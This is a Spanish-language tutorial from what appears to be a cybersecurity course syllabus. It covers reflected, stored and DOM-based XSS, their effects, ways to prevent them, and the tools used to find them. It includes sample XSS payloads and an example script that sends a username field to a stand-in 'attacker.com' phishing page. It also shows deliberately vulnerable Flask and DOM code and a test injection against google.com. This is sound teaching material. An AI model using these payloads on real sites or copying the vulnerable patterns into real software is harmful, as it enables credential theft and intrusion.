---
title: "Como realizar o prevenir el ataque XSS (secuencias de comandos entre sitios)"  
subtitle: "ğŸ” Definicion, ejemplos y todo lo que necesitas saber sobre como realizar o prevenir el ataque XSS Cross-site scripting en tu aplicaciÃ³n web"  
tags: ["pentesting", "ciberseguridad"]  
authors: ["alesanchezr"]
keyword: "ataque xss"

---

**ğŸš¨ Â¡IMPORTANTÃSIMO!** Antes de empezar, XSS es la vulnerabilidad mÃ¡s importante de todas, estÃ¡ presente en mÃ¡s del 40% de los sitios web ğŸŒ. Vamos a prestarle toda la atenciÃ³n posible, no solo a esta vulnerabilidad sino a todo el OWASP Top 10.

![XSS1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss1.png?raw=true)

Cross-site scripting (XSS) es cuando un sitio web tiene entradas de datos no validadas que permiten al atacante inyectar cÃ³digo HTML, CSS o Javascript dentro de la pÃ¡gina objetivo. Por ejemplo:

## ğŸ¯ Atacando Google.com con XSS Reflejado (Reflected XSS)

Si te fijas bien, cuando usas google.com para buscar, por ejemplo, "Â¿QuÃ© es XSS?" el tÃ©rmino de bÃºsqueda que escribiste se aÃ±ade a la URL de la pÃ¡gina de resultados como un "query string" de la siguiente manera:

```url
https://www.google.com/search?q=ques+es+xss
```

Cualquier combinaciÃ³n de caracteres que usemos para buscar pasarÃ¡ a ser parte de la URL de los resultados de bÃºsqueda y luego pasarÃ¡ a ser parte del `<body>` de la pÃ¡gina de resultados.

![xss a google.com](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pentesting-red-team/xss-search-term.jpg?raw=true)

### ğŸ’‰ Inyectando scripts a la pÃ¡gina atacada

Si inyectamos el texto `"Â¿QuÃ© es XSS?"` a la pÃ¡gina de google.com, tal vez podamos inyectar un script de JS que abra un nuevo modal:

```url
https://www.google.com/search?q=<script>alert('Hola Mundo')</script>
```

Â¡ğŸ‰ Hemos logrado que nuestro cÃ³digo sea incluido en la pÃ¡gina de Google! [Pincha aquÃ­ para comprobarlo](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pentesting-red-team/xaa-script-attempt.jpg?raw=true).

### ğŸ” Google.com estÃ¡ protegido contra XSS

La mala noticia es que, a pesar de que nuestro cÃ³digo `<script>alert('Hola Mundo')</script>` aparece dentro del cÃ³digo fuente de google.com, Â¡no se estÃ¡ ejecutando! ğŸ˜•

Seguramente Google estÃ¡ transformando nuestro cÃ³digo en caracteres inofensivos para evitar que el navegador web los interprete.

### âš ï¸ Ejemplos de scripts mÃ¡s maliciosos

Un simple `<script>alert('Hola Mundo')</script>` es inofensivo, pero el siguiente script serÃ­a mucho peor:

```js
<script>
    window.location = "http://attacker.com/phishing-page?data=" + document.getElementById('username').value;
</script>
```

Este ataque podrÃ­a ser utilizado para redirigir a los usuarios a una pÃ¡gina de phishing que parece legÃ­tima pero estÃ¡ controlada por el atacante. En el proceso, el atacante podrÃ­a robar el nombre de usuario u otra informaciÃ³n sensible que el usuario haya introducido en el sitio original. Esto podrÃ­a llevar al robo de credenciales o a engaÃ±ar al usuario para que proporcione mÃ¡s informaciÃ³n en la pÃ¡gina de phishing.

#### ğŸ› ï¸ Â¿QuÃ© hace este cÃ³digo?

1. **Etiqueta `<script>`:** El atacante inyecta una etiqueta `<script>` en la pÃ¡gina web. Cuando se carga la pÃ¡gina, el navegador de la vÃ­ctima ejecutarÃ¡ este script.

2. **ğŸš¨ RedirecciÃ³n maliciosa:** El script utiliza `window.location` para redirigir al usuario a una URL controlada por el atacante, en este caso, `http://attacker.com/phishing-page`. La parte clave de esta redirecciÃ³n es que el script tambiÃ©n adjunta datos sensibles a la URL.

3. **ğŸ”“ Robo de informaciÃ³n del usuario:** El script obtiene el valor del campo de entrada con el ID `username`, que podrÃ­a ser el nombre de usuario o alguna otra informaciÃ³n sensible que el usuario haya introducido en la pÃ¡gina. Este valor se adjunta a la URL de la pÃ¡gina de phishing y es enviado al servidor del atacante.

## Otros tipos de XSS

### ğŸ—ƒï¸ XSS Almacenado (Stored XSS)

Imagina una red social donde los usuarios pueden publicar comentarios en los perfiles de otros usuarios. Estos comentarios se almacenan en una base de datos y se muestran cada vez que alguien visita el perfil.

**Ejemplo de cÃ³digo vulnerable:**

```python
@app.route('/post_comment', methods=['POST'])
def post_comment():
    comment = request.form['comment']
    comments.append(comment)  # Guardar comentario sin sanitizar
    return "Comentario publicado"

@app.route('/view_comments')
def view_comments():
    comments_html = "".join(f"<p>{comment}</p>" for comment in comments)
    return render_template_string(comments_html)  # Vulnerable a XSS
```

**Ataque:**
Un atacante puede publicar un comentario como el siguiente:

```html
<script>alert('XSS Almacenado');</script>
```

Cuando otros usuarios visiten la pÃ¡gina del perfil, este script se ejecutarÃ¡ en sus navegadores, mostrando una alerta o realizando alguna acciÃ³n maliciosa.

### ğŸ§© XSS Basado en DOM (DOM-based XSS)

**Escenario:**
Una pÃ¡gina web utiliza JavaScript para mostrar el contenido de la URL directamente en el DOM, como parte de una funcionalidad que muestra un saludo personalizado.

**Ejemplo de cÃ³digo vulnerable:**

```html
<!-- HTML - CÃ³digo que manipula el DOM -->
<!DOCTYPE html>
<html>
<head>
    <title>Bienvenido</title>
</head>
<body>
    <h1>Bienvenido</h1>
    <p id="greeting"></p>
    <script>
        var greeting = "Hola " + window.location.search.substring(1);
        document.getElementById("greeting").innerHTML = greeting;
    </script>
</body>
</html>
```

**Ataque:**
Un atacante podrÃ­a enviar un enlace malicioso:

```
http://ejemplo.com/index.html?nombre=<script>alert('XSS DOM');</script>
```

Al abrir esta URL, el navegador de la vÃ­ctima ejecutarÃ¡ el script malicioso porque el contenido del parÃ¡metro `nombre` se inserta directamente en el DOM sin ser saneado.

## ğŸ•µï¸â€â™‚ï¸ Â¿QuÃ© puede lograr un atacante con XSS?

Un atacante puede lograr diversas acciones maliciosas a travÃ©s de un ataque de Cross-Site Scripting (XSS), dependiendo del tipo de XSS y del contexto en el que se explote la vulnerabilidad. A continuaciÃ³n, se enumeran algunas de las acciones mÃ¡s comunes que un atacante podrÃ­a llevar a cabo utilizando XSS:

### 1. **ğŸ” Robo de cookies y sesiones:**
   - Un atacante puede utilizar XSS para robar cookies de sesiÃ³n del usuario, lo que le permite suplantar la identidad de la vÃ­ctima en la aplicaciÃ³n web. Con las cookies de sesiÃ³n, el atacante puede acceder a la cuenta del usuario y realizar acciones como si fuera la vÃ­ctima.

### 2. **ğŸ–¼ï¸ DesfiguraciÃ³n de sitios web:**
   - El atacante puede inyectar cÃ³digo JavaScript que modifique el contenido visible de la pÃ¡gina web, alterando textos, imÃ¡genes o la estructura de la pÃ¡gina para mostrar mensajes ofensivos o engaÃ±osos.

### 3. **ğŸ”— RedirecciÃ³n a sitios de phishing:**
   - El atacante puede redirigir a los usuarios a sitios web maliciosos, como pÃ¡ginas de phishing, donde se engaÃ±a a los usuarios para que introduzcan sus credenciales o informaciÃ³n personal.

### 4. **ğŸ‘¤ Ejecutar acciones en nombre del usuario (Robo de clics):**
   - Mediante la manipulaciÃ³n de formularios o botones, el atacante puede ejecutar acciones en nombre del usuario, como enviar mensajes, cambiar configuraciones de cuenta, o realizar transacciones no autorizadas.

### 5. **ğŸ” Acceso a informaciÃ³n sensible:**
   - El script malicioso puede acceder a datos confidenciales en la pÃ¡gina, como contenido de formularios o informaciÃ³n de perfil, y enviarla al servidor del atacante.

### 6. **ğŸ’» Cargar y ejecutar cÃ³digo malicioso externo:**
   - El atacante puede inyectar cÃ³digo que carga scripts externos desde un servidor bajo su control, permitiendo la ejecuciÃ³n de malware o la explotaciÃ³n de otras vulnerabilidades en el navegador del usuario.

### 7. **âŒ¨ï¸ Keylogging:**
   - A travÃ©s de XSS, el atacante puede inyectar un keylogger, un script que registra las pulsaciones de teclas del usuario, capturando contraseÃ±as, nÃºmeros de tarjetas de crÃ©dito y cualquier otra informaciÃ³n sensible que el usuario escriba.

### 8. **ğŸ”“ EscalaciÃ³n de privilegios:**
   - Si el atacante puede ejecutar scripts en el contexto del navegador de un usuario con privilegios elevados (por ejemplo, un administrador), puede realizar acciones administrativas o acceder a funciones restringidas de la aplicaciÃ³n.

### 9. **ğŸ”’ Ataques CSRF (Cross-Site Request Forgery):**
   - XSS puede ser utilizado para facilitar ataques CSRF, donde el script malicioso provoca que el navegador del usuario realice solicitudes no deseadas a otra aplicaciÃ³n en la que el usuario estÃ© autenticado.

### 10. **ğŸŒ RecolecciÃ³n de informaciÃ³n del entorno del usuario:**
   - El atacante puede utilizar X

SS para obtener informaciÃ³n sobre el entorno del usuario, como el tipo de navegador, la versiÃ³n del sistema operativo, plugins instalados, direcciÃ³n IP, etc., que podrÃ­an ser utilizados en ataques dirigidos.

### 11. **ğŸ›‘ DenegaciÃ³n de servicio (DoS):**
   - El atacante puede crear scripts que sobrecarguen la pÃ¡gina web o el navegador del usuario, provocando una DenegaciÃ³n de Servicio (DoS) que afecta la disponibilidad de la aplicaciÃ³n para el usuario.

## ğŸ”’ Â¿CÃ³mo prevenir XSS?

Evitar ataques de Cross-Site Scripting (XSS) es fundamental para proteger tus aplicaciones web y a tus usuarios. A continuaciÃ³n, te presento una serie de prÃ¡cticas recomendadas para prevenir XSS en tus aplicaciones:

### 1. **ğŸš§ Escapar el contenido HTML**

Escapa todos los datos que se insertan en el HTML antes de renderizarlos en la pÃ¡gina. Esto significa convertir caracteres especiales como `<`, `>`, `&`, y `"` en sus entidades HTML correspondientes.

```python
from flask import escape
safe_string = escape(unsafe_string)
```
```javascript
const escape = require('escape-html');
let safeString = escape(unsafeString);
```

### 2. **ğŸ›¡ï¸ Usar plantillas que escapan automÃ¡ticamente**

Utiliza motores de plantillas que escapan automÃ¡ticamente el contenido insertado. La mayorÃ­a de los frameworks modernos, como Flask (con Jinja2), Django, Laravel (Blade), y Express (con EJS o Pug), escapan el contenido por defecto.

```python
{{ user_input }}
```
```ejs
<%= userInput %>
```

### 3. **ğŸ” ValidaciÃ³n y sanitizaciÃ³n de entrada**

Valida y sanitiza la entrada del usuario para asegurarte de que contiene solo lo que esperas. Elimina o codifica cualquier parte que no sea segura.

 ```python
 from wtforms import StringField
 from wtforms.validators import InputRequired, Length

 class MyForm(FlaskForm):
     name = StringField('Name', validators=[InputRequired(), Length(max=100)])
 ```
 ```javascript
 const { body } = require('express-validator');
 
 app.post('/submit', [
     body('username').isAlphanumeric().trim().escape()
 ], (req, res) => {
     // Handle request
 });
 ```

### 4. **ğŸ“œ Uso de Content Security Policy (CSP)**

Implementa una polÃ­tica de seguridad de contenido (CSP) para limitar las fuentes desde las cuales se pueden cargar scripts. Esto ayuda a mitigar XSS al bloquear la ejecuciÃ³n de scripts no autorizados.

**Ejemplo de cabecera CSP:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com
```

### 5. **ğŸ” Utilizar HTTPOnly y Secure en cookies**

AsegÃºrate de que las cookies de sesiÃ³n tengan los flags `HttpOnly` y `Secure` para que no puedan ser accedidas por JavaScript ni transmitidas a travÃ©s de una conexiÃ³n insegura.

```python
response.set_cookie('sessionid', value=session_id, httponly=True, secure=True)
```
```javascript
res.cookie('sessionid', session_id, { httpOnly: true, secure: true });
```

### 6. **âŒ Evitar JavaScript inline y eventos en HTML**

Evita el uso de cÃ³digo JavaScript directamente en etiquetas HTML (`<script>`, `onload=`, `onclick=`, etc.). Usa archivos de scripts externos o declara las funciones en un archivo JS separado.

**ğŸš« Malo:**
```html
<img src="image.jpg" onerror="alert('XSS')">
```

**âœ… Bueno:**
```html
<img src="image.jpg" id="image">
<script>
    document.getElementById('image').addEventListener('error', function() {
        alert('XSS');
    });
</script>
```

### 7. **ğŸ§¹ SanitizaciÃ³n de HTML en entradas de usuario**

Si debes permitir que los usuarios envÃ­en HTML (por ejemplo, en un editor de texto enriquecido), usa una biblioteca que sanee el HTML y elimine cualquier cÃ³digo peligroso.

```python
from bleach import clean

safe_html = clean(unsafe_html)
```
```javascript
const sanitizeHtml = require('sanitize-html');
let safeHtml = sanitizeHtml(unsafeHtml);
```

## ğŸ› ï¸ Herramientas para evitar o atacar con XSS

Existen varias herramientas utilizadas por profesionales de la seguridad y atacantes para identificar y explotar vulnerabilidades de Cross-Site Scripting (XSS) en aplicaciones web. Estas herramientas pueden automatizar el proceso de descubrimiento de XSS o facilitar la explotaciÃ³n de vulnerabilidades existentes. A continuaciÃ³n, se enumeran algunas de las herramientas mÃ¡s conocidas para atacar con XSS:

A continuaciÃ³n, te presento una tabla comparativa de las principales herramientas utilizadas para atacar y detectar vulnerabilidades de Cross-Site Scripting (XSS):

| **ğŸ”§ Herramienta**      | **ğŸ“„ DescripciÃ³n**                                                                 | **âš™ï¸ CaracterÃ­sticas principales**                                          | **ğŸ“œ Licencia**      | **ğŸ“Š Nivel de complejidad** |
|----------------------|---------------------------------------------------------------------------------|--------------------------------------------------------------------------|-------------------|--------------------------|
| **Burp Suite**       | Herramienta profesional para pruebas de penetraciÃ³n en aplicaciones web.        | Escaneo automatizado de XSS, proxy, modificaciÃ³n de solicitudes, repeater. | Comercial (versiÃ³n gratuita limitada) | Alta                     |
| **OWASP ZAP**        | Herramienta gratuita y de cÃ³digo abierto para pruebas de seguridad en aplicaciones web. | Escaneo automatizado de XSS, proxy, fuzzing, y anÃ¡lisis manual.           | Open Source       | Media                     |
| **XSSer**            | Herramienta especializada en la detecciÃ³n y explotaciÃ³n de vulnerabilidades XSS. | DetecciÃ³n y explotaciÃ³n de XSS (almacenado, reflejado, DOM), payloads personalizados. | Open Source       | Media                     |
| **BeEF**             | Framework avanzado para la explotaciÃ³n de navegadores web comprometidos.        | Control de navegadores vÃ­ctimas, ejecuciÃ³n de comandos, integraciÃ³n con otras herramientas. | Open Source       | Alta                     |
| **XSStrike**         | Herramienta avanzada para anÃ¡lisis, detecciÃ³n y explotaciÃ³n de XSS.             | AnÃ¡lisis de payloads, superaciÃ³n de WAFs, escaneo manual y automatizado. | Open Source       | Media                     |
| **SQLMap**           | Herramienta para pruebas de inyecciÃ³n SQL con soporte limitado para XSS.        | Escaneo y explotaciÃ³n de inyecciÃ³n SQL, integraciÃ³n con XSS.              | Open Source       | Alta                     |
| **wfuzz**            | Herramienta de fuzzing para pruebas en aplicaciones web, Ãºtil para encontrar XSS. | Fuzzing de parÃ¡metros, soporte de listas personalizadas (payloads XSS).    | Open Source       | Media                     |
| **Google Dorking**   | TÃ©cnica de bÃºsqueda avanzada en Google para encontrar aplicaciones vulnerables. | BÃºsqueda de vulnerabilidades expuestas pÃºblicamente.                      | -                 | Baja                      |

### ğŸ“Š Resumen de la tabla:

- **Burp Suite:** Ideal para profesionales de la seguridad que requieren una herramienta completa para pruebas de penetraciÃ³n, aunque su versiÃ³n gratuita es limitada.
- **OWASP ZAP:** Una alternativa gratuita a Burp Suite, adecuada tanto para principiantes como para expertos.
- **XSSer:** Especializada en XSS, adecuada para quienes buscan detectar y explotar exclusivamente vulnerabilidades XSS.
- **BeEF:** Potente para controlar navegadores comprometidos, ideal para escenarios avanzados de explotaciÃ³n.
- **XSStrike:** Herramienta avanzada centrada en la detecciÃ³n y superaciÃ³n de mecanismos de seguridad relacionados con XSS.
- **SQLMap:** Aunque se centra en inyecciÃ³n SQL, tambiÃ©n ofrece capacidades para explotaciÃ³n XSS.
- **wfuzz:** Buena opciÃ³n para pruebas de fuzzing en aplicaciones web, incluyendo la detecciÃ³n de XSS.
- **Google Dorking:** TÃ©cnica Ãºtil para identificar vulnerabilidades XSS expuestas en la web pÃºblica, fÃ¡cil de utilizar.

Cada herramienta tiene sus fortalezas y se adapta a diferentes necesidades y niveles de experiencia, desde principiantes hasta profesionales avanzados en ciberseguridad.
